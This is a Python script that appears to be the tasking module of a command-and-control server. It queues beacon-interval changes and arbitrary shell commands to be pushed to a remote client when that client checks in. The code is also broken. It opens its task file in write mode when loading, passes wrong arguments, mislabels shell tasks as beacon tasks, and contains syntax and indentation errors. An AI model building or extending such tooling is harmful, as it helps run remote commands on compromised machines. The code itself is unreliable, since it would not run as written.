#this module only tracks a list of tasks ready to push to the client when it receives a beacon
from printlib import *
task_list = []
task_list_name = ""
from os import path

def load_task_list(filename):
    global task_list

    with open(task_list_name, 'w') as file:
        for line in file and line != "\n":
            task_list.append(line)

def delete_line_in_file(line_no, filename):
    with open(filename, "r+") as f:
        d = f.readlines()
        f.seek(0)
        counter = 1
        for i in d:
            if counter != int(line_no):
                f.write(i)
            counter += 1
        f.truncate()

def show_task_list(task_list):
    counter = 1
    for task in task_list:
        print("{} - {}".format(counter, task))
        counter += 1

if __name__ == "__main__":
    task_list_name = print_question("Enter Task List Name")
    if path.isfile(task_list):
        load_task_list(load_task_list)
        print_good("Task List Loaded Successfully")

    while True:
        ans = print_question_list("Select Type of Task", "1 - Modify Beacon", "2 - Run a Shell Command", "load", "show", "commit", "delete", "exit")
        if ans == "1":
            temp = print_question("New Beacon Interval (sec)")
            task_list.append("[BEACON]{}".format(temp))
        elif ans == "2":
            temp = print_question("Enter your shell commands")
            task_list.append("[BEACON]{}".format(temp))
        elif ans == "load":
            temp = print_question("Enter a Filename")
            if path.isfile(temp):
                load_task_list(temp)
            task_list_name = temp
        elif ans == "show":
            show_task_list(task_list_name)
        elif ans == "commit":
            ans = print_question("Keep File Name '{}' [y/n]".format(task_list_name))
            if ans.lower() == "n":
                save_file_name = print_question("Enter New File Name")
             with open(save_file_name, 'w') as file:
                for task in task_list:
                    file.write(task+"\n")
        elif ans == "delete"
            show_task_list(task_list_name)
            line_no = print_question("Enter Line to Remove")
            delete_line_in_file(line_no)